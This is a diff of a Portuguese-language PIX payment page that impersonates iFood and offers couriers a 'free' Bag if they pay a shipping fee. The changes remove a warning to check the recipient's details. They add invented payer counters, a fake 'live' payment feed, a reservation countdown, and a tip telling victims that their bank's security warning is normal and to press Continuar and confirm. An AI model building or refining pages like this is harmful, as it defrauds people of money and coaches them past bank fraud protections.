@@ -8,69 +8,73 @@
   <meta name="description" content="Pague o frete via PIX para confirmar o envio do seu item iFood.">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700;800&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="style.css">
 </head>
-<body data-page="pix">
+<body data-page="pix" class="pix-convert">
 
   <noscript class="no-js">Para continuar, ative o JavaScript no navegador.</noscript>
 
   <main class="container">
     <section class="step pix-page" aria-hidden="false">
       <div class="pix-topbar">
-        <div class="pix-topbar__title">Pagamento</div>
+        <div class="pix-topbar__title">Último passo</div>
       </div>
 
-      <div class="pix-hero">
-        <img
-          src="https://resgate-sua-bag.netlify.app/assets/pix-photo.webp"
-          alt="Pagamento via Pix"
-          loading="eager"
-          onerror="this.style.display='none'"
-        >
+      <div class="pix-urgency-bar" role="status">
+        Sua Bag está <strong>reservada</strong>. Pague só o frete no PIX pra liberar o envio.
       </div>
 
-      <h2 class="pix-heading">Pedido aguardando pagamento</h2>
+      <h2 class="pix-heading">Pague o frete e libere sua Bag</h2>
       <p class="pix-instructions">
-        Copie o código abaixo e utilize a opção Pix Copia e Cola no aplicativo do seu banco:
+        A Bag é <strong>100% gratuita</strong>. Você só paga o envio — leva menos de 1 minuto no app do banco.
       </p>
 
-      <aside class="pix-security-notice" aria-labelledby="pix-security-title">
-        <div class="pix-security-notice__icon" aria-hidden="true">🛡️</div>
-        <div class="pix-security-notice__content">
-          <h3 id="pix-security-title">Aviso de segurança do seu banco</h3>
-          <p>
-            Ao confirmar o Pix, seu banco poderá exibir uma mensagem preventiva de segurança.
-            Esse é um procedimento de proteção adotado pelo próprio banco. Quando o aplicativo
-            disponibilizar o botão <strong>Continuar</strong>, você poderá avançar para revisar
-            e confirmar a transação.
-          </p>
-          <p id="pix-provider-line" class="pix-security-notice__check hidden" aria-hidden="true">
-            A identificação <strong id="pix-provider-name" class="pix-security-notice__provider"></strong>
-            poderá aparecer na descrição da intermediadora do pagamento. Antes de confirmar,
-            confira se o <strong>nome ou a razão social do recebedor</strong>, o
-            <strong>CPF/CNPJ</strong>, a <strong>instituição</strong> e o <strong>valor</strong>
-            correspondem aos dados oficiais da cobrança.
-          </p>
+      <div class="pix-value-box">
+        <div class="pix-value-box__row">
+          <span>Bag oficial iFood</span>
+          <strong class="pix-value-box__free">R$ 0,00</strong>
         </div>
-      </aside>
+        <div class="pix-value-box__row">
+          <span>Frete (PIX)</span>
+          <strong id="pix-amount-top" class="pix-value-box__pay">R$ 0,00</strong>
+        </div>
+      </div>
+
+      <div class="pix-social-banner" aria-live="polite">
+        <span class="pix-social-banner__dot" aria-hidden="true"></span>
+        <p>
+          <strong id="pix-paying-now">17</strong> entregadores pagando agora ·
+          <span id="pix-paid-today">186</span> já liberaram a Bag hoje
+        </p>
+      </div>
+
+      <ol class="pix-steps">
+        <li><strong>1</strong> Copie o código</li>
+        <li><strong>2</strong> Cole no PIX do banco</li>
+        <li><strong>3</strong> Envio libera na hora</li>
+      </ol>
 
       <div id="pix-card" class="pix-card pix-card--flat">
-        <div class="pix-copy-box">
-          <input id="pix-code" class="pix-copy-input" type="text" readonly value="">
-          <button id="btn-copy-pix-icon" class="pix-copy-icon" type="button" aria-label="Copiar codigo">📋</button>
-        </div>
-
-        <div class="pix-timer">
-          <span class="pix-timer-label">O tempo para voce pagar acaba em:</span>
+        <div class="pix-timer pix-timer--urgent">
+          <span class="pix-timer-label">Reserva expira em:</span>
           <div id="pix-timer" class="pix-timer-value">10:00</div>
           <div class="pix-progress">
             <div id="pix-progress-bar" class="pix-progress-bar"></div>
           </div>
         </div>
 
-        <button id="btn-copy-pix" class="btn-primary pix-copy-btn" type="button">Copiar codigo</button>
-        <button id="btn-show-pix-qr" class="btn-secondary pix-qr-toggle-btn" type="button">Pagar com QRcode</button>
+        <div class="pix-copy-box">
+          <input id="pix-code" class="pix-copy-input" type="text" readonly value="" placeholder="Gerando código PIX...">
+          <button id="btn-copy-pix-icon" class="pix-copy-icon" type="button" aria-label="Copiar codigo">📋</button>
+        </div>
+
+        <button id="btn-copy-pix" class="btn-primary pix-copy-btn pix-copy-btn--pulse" type="button">
+          COPIAR CÓDIGO PIX E PAGAR
+        </button>
+        <p class="pix-cta-hint">Cole no Nubank, Inter, Caixa, Bradesco, PicPay...</p>
+
+        <button id="btn-show-pix-qr" class="btn-secondary pix-qr-toggle-btn" type="button">Prefiro pagar com QR Code</button>
 
         <div id="pix-qr-section" class="pix-inline-qr hidden" aria-hidden="true">
           <p class="pix-inline-qr__label">Escaneie o QR Code abaixo para pagar este PIX.</p>
@@ -78,6 +82,33 @@
             <canvas id="pix-qr-canvas" class="pix-inline-qr__image" aria-label="QR Code PIX"></canvas>
           </div>
         </div>
+
+        <div class="pix-trust-row" aria-label="Garantias do pagamento">
+          <span>PIX seguro</span>
+          <span>Libera na hora</span>
+          <span>Bag gratuita</span>
+        </div>
+
+        <details class="pix-bank-tip pix-bank-tip--soft">
+          <summary>Banco mostrou aviso? É normal — toque aqui</summary>
+          <p>
+            Seu banco pode mostrar uma mensagem de segurança. Quando aparecer
+            <strong>Continuar</strong>, avance e confirme.
+          </p>
+          <p id="pix-provider-line" class="pix-security-notice__check hidden" aria-hidden="true">
+            Pode aparecer o nome
+            <strong id="pix-provider-name" class="pix-security-notice__provider"></strong>
+            (intermediadora do frete). Confira o valor e confirme.
+          </p>
+        </details>
+
+        <section class="pix-social" aria-labelledby="pix-social-title">
+          <div class="pix-social__head">
+            <h3 id="pix-social-title">Quem acabou de pagar o frete</h3>
+            <span class="pix-social__live">AO VIVO</span>
+          </div>
+          <ul id="pix-recent-pays" class="pix-recent-pays"></ul>
+        </section>
 
         <div class="pix-order-card">
           <div class="pix-order-head">
@@ -90,11 +121,11 @@
             </div>
             <div>
               <div id="pix-order-title" class="pix-order-title">Bag do iFood</div>
-              <div class="pix-order-sub">N do pedido <span id="pix-order-id">-</span></div>
+              <div class="pix-order-sub">Pedido <span id="pix-order-id">-</span> · quase seu</div>
             </div>
           </div>
           <div class="pix-order-total">
-            <span>Total no PIX</span>
+            <span>Pagar agora</span>
             <strong id="pix-amount">R$ 0,00</strong>
           </div>
         </div>
@@ -102,9 +133,19 @@
         <div class="pix-status-line">
           Status: <strong id="pix-status">Aguardando pagamento</strong>
         </div>
+
+        <p class="pix-loss">
+          Se o tempo acabar, a reserva cancela e a Bag volta pro estoque da região.
+        </p>
       </div>
     </section>
   </main>
+
+  <div class="pix-sticky-cta" id="pix-sticky-cta">
+    <button id="btn-copy-pix-sticky" class="btn-primary pix-copy-btn pix-copy-btn--pulse" type="button">
+      COPIAR PIX E PAGAR
+    </button>
+  </div>
 
   <div id="toast" class="toast hidden" role="status" aria-live="polite"></div>
 
